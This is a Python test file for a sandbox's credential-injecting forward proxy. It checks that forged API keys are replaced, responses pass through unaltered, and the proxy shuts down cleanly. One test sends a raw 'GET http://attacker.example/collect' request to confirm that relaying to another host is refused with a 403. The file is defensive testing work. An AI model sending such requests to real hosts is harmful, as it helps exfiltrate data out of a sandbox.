"""B97's forward proxy, second slice: the real server.

`build_forward_request` (`tests/test_forward_proxy.py`) is the pure transform; this file proves
the socket wiring around it against a real listener, the same way `test_patch_sandbox.py` proves
`sandbox.py`'s primitives against real Docker rather than a mock. Two real HTTP servers talk to
each other here: a fake "upstream" that records what it received, and the real proxy under test,
started on `127.0.0.1` with an OS-assigned port so tests never collide over a fixed one.

What this proves, end to end, that the pure-function tests could not: a request actually sent to
the proxy over a real socket reaches the fake upstream with the real credential attached and the
container's own forged one gone, and a request whose target names another host outright never
reaches the upstream at all.
"""

from __future__ import annotations

import threading
from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from typing import Iterator

import httpx
import pytest

from sync.remediate.forward_proxy import ProxyConfig
from sync.remediate.forward_proxy_server import running_proxy

CREDENTIAL = "sk-real-proxy-held-credential"


class _RecordingUpstream(BaseHTTPRequestHandler):
    """Records every request it receives and answers with a fixed, recognisable body."""

    received: list[dict] = []  # class-level: one handler instance per request

    def _record(self) -> None:
        length = int(self.headers.get("content-length", 0))
        body = self.rfile.read(length) if length else b""
        type(self).received.append(
            {
                "method": self.command,
                "path": self.path,
                "headers": dict(self.headers.items()),
                "body": body,
            }
        )
        self.send_response(200)
        self.send_header("content-type", "application/json")
        payload = b'{"ok": true}'
        self.send_header("content-length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def do_GET(self) -> None:
        self._record()

    def do_POST(self) -> None:
        self._record()

    def log_message(self, format: str, *args) -> None:  # noqa: A002 - stdlib signature
        pass  # silence BaseHTTPRequestHandler's default stderr logging in test output


@contextmanager
def _running_upstream() -> Iterator[tuple[str, list[dict]]]:
    _RecordingUpstream.received = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), _RecordingUpstream)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        host, port = server.server_address[:2]
        yield f"http://{host}:{port}", _RecordingUpstream.received
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_a_request_reaches_the_upstream_with_the_real_credential_attached():
    with _running_upstream() as (upstream_url, received):
        config = ProxyConfig(
            upstream=upstream_url, credential_header="x-api-key", credential_value=CREDENTIAL,
        )
        with running_proxy(config) as proxy_url:
            response = httpx.post(
                f"{proxy_url}/v1/messages",
                headers={"x-api-key": "sk-forged-by-the-container", "content-type": "application/json"},
                content=b'{"model": "claude-opus-5"}',
            )
        assert response.status_code == 200
        assert len(received) == 1
        assert received[0]["path"] == "/v1/messages"
        assert received[0]["headers"]["x-api-key"] == CREDENTIAL
        assert received[0]["body"] == b'{"model": "claude-opus-5"}'


def test_the_response_from_upstream_reaches_the_container_unaltered():
    with _running_upstream() as (upstream_url, _received):
        config = ProxyConfig(
            upstream=upstream_url, credential_header="x-api-key", credential_value=CREDENTIAL,
        )
        with running_proxy(config) as proxy_url:
            response = httpx.post(f"{proxy_url}/v1/messages", content=b"{}")
        assert response.status_code == 200
        assert response.json() == {"ok": True}


def test_an_absolute_uri_target_never_reaches_the_upstream():
    """The one property a pure-function test cannot prove by itself: that a real client asking
    this proxy to relay somewhere else is refused before a byte reaches the upstream, not merely
    that the transform function raises when called directly.
    """
    with _running_upstream() as (upstream_url, received):
        config = ProxyConfig(
            upstream=upstream_url, credential_header="x-api-key", credential_value=CREDENTIAL,
        )
        with running_proxy(config) as proxy_url:
            # httpx will not itself construct an absolute-URI request line against an
            # http:// base, so the raw socket is used directly -- the same shape a client
            # deliberately trying the classic forward-proxy trick would send.
            import socket

            host, port = httpx.URL(proxy_url).host, httpx.URL(proxy_url).port
            with socket.create_connection((host, port), timeout=5) as sock:
                sock.sendall(
                    b"GET http://attacker.example/collect HTTP/1.1\r\n"
                    b"Host: attacker.example\r\n"
                    b"Connection: close\r\n\r\n"
                )
                status_line = sock.recv(4096)
        assert status_line.startswith(b"HTTP/1.1 403")
        assert received == []


def test_two_consecutive_requests_both_reach_the_upstream():
    """The server survives more than one request in its lifetime -- a single-shot handler that
    tears itself down after the first request would be useless for a real patch attempt, which
    makes several calls across one turn.
    """
    with _running_upstream() as (upstream_url, received):
        config = ProxyConfig(
            upstream=upstream_url, credential_header="x-api-key", credential_value=CREDENTIAL,
        )
        with running_proxy(config) as proxy_url:
            httpx.post(f"{proxy_url}/v1/messages", content=b"{}")
            httpx.post(f"{proxy_url}/v1/messages", content=b"{}")
        assert len(received) == 2


def test_the_proxy_stops_listening_once_the_context_manager_exits():
    with _running_upstream() as (upstream_url, _received):
        config = ProxyConfig(
            upstream=upstream_url, credential_header="x-api-key", credential_value=CREDENTIAL,
        )
        with running_proxy(config) as proxy_url:
            pass
        # Windows can answer a connect attempt against a just-closed local port either with an
        # immediate refusal or with silence until the client's own timeout, depending on how the
        # OS reclaims the socket -- both mean the same fact (nothing is listening any more), so
        # both are accepted rather than pinning one platform's specific behaviour.
        with pytest.raises((httpx.ConnectError, httpx.ConnectTimeout)):
            httpx.get(proxy_url, timeout=2)
